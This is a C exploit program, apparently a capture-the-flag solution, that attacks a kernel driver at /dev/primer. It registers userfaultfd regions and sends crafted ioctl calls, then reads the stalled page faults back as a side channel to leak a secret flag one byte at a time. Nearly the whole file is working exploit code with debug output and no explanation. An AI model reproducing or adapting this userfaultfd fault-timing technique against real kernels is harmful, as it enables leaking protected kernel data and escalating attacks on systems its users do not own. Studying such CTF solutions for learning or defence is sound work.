#define _GNU_SOURCE
#include <asm-generic/errno-base.h>
#include <bits/types/struct_itimerspec.h>
#include <bits/time.h>
#include <sys/timerfd.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
#include <string.h>


cpu_set_t pwn_cpu;

char* filename = "/dev/primer";
int pfd;
#define IOCTL_QUERY 0x80086400

uint8_t* base_addr;
char flag[0x100];

//SYSCALL_DEFINE1(userfaultfd, int, flags);
long uffd; //for exfiltration
uint64_t count = 0;

struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;

void pioctl(uint64_t offset,uint64_t addr){
    //addr &= 0x00FFFFFFFFFFFFFF;
    int ret = 0;
    uint64_t call = 0x80086400;
    addr |= (offset << 56);

    ret = ioctl(pfd, call, addr);
}

cpu_set_t cpu;

void set_cpu(int id) {
    CPU_ZERO(&cpu);
    CPU_SET(id, &cpu);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu);
}

static void* handle_fault_thread(void *arg){
    printf("[*] entering the fault handling thread\n");

    char* dummy_page;
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    long ufd = (long)arg;
    struct pollfd pollfd;
    int nready;
    static int fault_cnt = 0;
    int check;
    dummy_page = malloc(0x1000);

    memset(dummy_page, 0x41, 0x1000);


    //if(sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu)){
    //    printf("[!] failed to alloc pwn_cpu\n");
    //    exit(-1);
    //}

    printf("[*] uffd: %ld\n", ufd);
    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    //wait
    while(poll(&pollfd, 1, -1)){
        printf("pollling\n");
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP){
            printf("[!] polling failed\n");
            exit(-1);
        }

        if(read(ufd, &msg, sizeof(msg)) == 0){
            printf("[!] failed to read\n");
            exit(-1);
        }

        //if(msg.event != UFFD_EVENT_PAGEFAULT){
        //    printf("%s unexpected page fault\n", fail);
        //    exit(-1);
        //}
        assert (msg.event == UFFD_EVENT_PAGEFAULT);

        printf("[+] page fault addr: 0x%llx\n", msg.arg.pagefault.address);
        flag[count++] = msg.arg.pagefault.address & 0xff;
        printf("flag: %c\n", (char)(msg.arg.pagefault.address & 0xff));
        printf("[+] page fault flags: 0x%llx\n", msg.arg.pagefault.flags);
        //TODO

        copy.src = (size_t)dummy_page;
        copy.dst = (size_t)msg.arg.pagefault.address & ~(0x1000-1);
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        if(ioctl(ufd, UFFDIO_COPY, &copy) == -1){
            printf("fail\n");
        }
        break;
    }
    return 0;
}


void register_uffd_and_halt(void* addr, size_t len){

    uffd = syscall(__NR_userfaultfd,O_CLOEXEC | O_NONBLOCK);
    if(uffd == -1){
        printf("failed to create uffd");
        exit(-1);
    } 
    printf("[+] UFFD created at: %ld\n", uffd);

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api)==-1){
        printf("[!] could not allocate the uffd_api\n");
        exit(-1);
    }

    printf("[+] initiated api\n");

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){
        printf("[!] failled to register the uffd: %ld\n", uffd);
        exit(-1);
    }

    printf("[+] registered userfaultfd!\n");
    return;
}


int main(){
    int s;
    pthread_t thr;
    uint64_t idx,i,check;
    pfd = open(filename, O_RDONLY);
    printf("[*] pfd: %d\n", pfd);

    for(idx = 0; idx < 0x23; idx++){
        base_addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        printf("[*] mmapped at address: %p\n", base_addr);

        register_uffd_and_halt(base_addr+0x1000, 0x1000);
        s = pthread_create(&thr, NULL, handle_fault_thread, (void*)uffd);
        usleep(10000);
        i = 0;
        check = 1;
        while(check){
            //printf("round : 0x%lx", i);
            pioctl(idx,(uint64_t)base_addr+0xf80+i);
            usleep(10000);
            int s = pthread_kill(thr, NULL);
            if(s == ESRCH) {
                pthread_join(thr, NULL);
                flag[idx] = 0x80-i; 
                printf("[+]flag: %s\n", flag);
                check = 0;
            } 
            i++;
        }
        munmap(base_addr, 0x2000);
    }
}
